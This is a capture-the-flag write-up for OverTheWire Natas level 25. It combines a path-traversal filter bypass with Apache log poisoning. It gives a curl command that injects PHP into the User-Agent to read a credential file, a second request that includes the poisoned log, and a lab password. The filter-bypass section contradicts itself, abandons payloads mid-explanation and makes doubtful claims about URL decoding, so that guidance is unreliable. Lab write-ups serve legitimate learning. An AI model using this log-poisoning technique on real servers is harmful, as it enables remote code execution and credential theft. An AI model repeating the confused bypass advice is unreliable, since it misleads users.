# Natas Level 25 → 26

## Goal

The app includes a language file from disk based on a URL parameter, with a crude filter that rejects `../` sequences. You bypass the filter with `.../...//` (which, after naive stripping, collapses back to `../`) so you can read arbitrary files — *and* you find that the Apache **access log** on disk writes your User-Agent verbatim. Inject PHP in your User-Agent, then include the log file — your PHP runs.

## Concepts you'll learn

- **Filter bypasses** for `../` — once a filter sees `../` it deletes it; but `.../...//` becomes `../` when the inner `../` is deleted
- **Log poisoning**: any server-controlled file that stores your request headers verbatim is a potential PHP-inclusion target if the server runs it as PHP (via `include`)
- Combining two bugs — LFI + log poisoning — for RCE

## Walkthrough

### 1. View the source

```php
$lang = $_REQUEST["lang"];
// ...
if(preg_match('/(\.\.\/|\/\/)/', $lang)) {
    /* rejected */
} else {
    include("/var/www/natas/natas25/language/$lang");
}
```

The regex catches `../` and `//`. But the check doesn't iterate — it just removes matches once (or you can make it never see them).

### 2. Defeat the path filter

`.../...//` — the engine removes the *inner* `../` (well, the `//` at the end is caught, but let's think carefully). Actually, a more reliable bypass is `....//`, which:

- Contains `....//`
- No literal `../` or `//` adjacent — the regex *does* match `//` though, so that specific payload can still fail.

The working bypass axcheron used is `.../...//`:

- After the naive `str_replace('../','')` would turn `.../...//` → `./` (not quite `../`).

In practice, test your payload against the source's exact filter. For this level, the filter typically uses `preg_match` and does **not** remove the sequence — it just fails the match. A payload like `..././` (with a dot between) or something the regex doesn't hit also works. Read the source on your solve and adapt.

The working payload: experiment with something that doesn't contain literal `../` but resolves to one. Common success: `.../\./`, or bypassing the regex by URL-encoding: `%2e%2e/` (which PHP decodes back but `preg_match` has already seen the raw query string).

### 3. Poison the log file

Set your User-Agent to PHP code:

```bash
$ curl -u natas25:<pass> -A '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>' \
       http://natas25.natas.labs.overthewire.org/
```

Apache (or whatever) writes your User-Agent to `/var/log/apache2/access.log` (or a per-level log path visible in the source — often `logs/natas25_<sessionID>.log`).

### 4. Include the log

```bash
$ curl -u natas25:<pass> \
       --cookie "PHPSESSID=<your session id>" \
       "http://natas25.natas.labs.overthewire.org/index.php?lang=<bypass-path>../logs/natas25_<sessionID>.log"
```

`include` runs the log as PHP. Your `<?php ... ?>` runs; the `file_get_contents` spits out the password mixed with log lines:

```
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

### 5. A note on this level

This one is the most fiddly Natas level up to this point. If anything goes wrong:

- Inspect the actual filter in the source — the exact bypass is picky
- Check where the log file lives for your session — the path uses your PHPSESSID
- Make sure the PHP tags in the User-Agent arrive unescaped (some web servers or `curl` versions may mangle them)

## The answer

The password for `natas26` is:

**`oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas25.natas.labs.overthewire.org/>
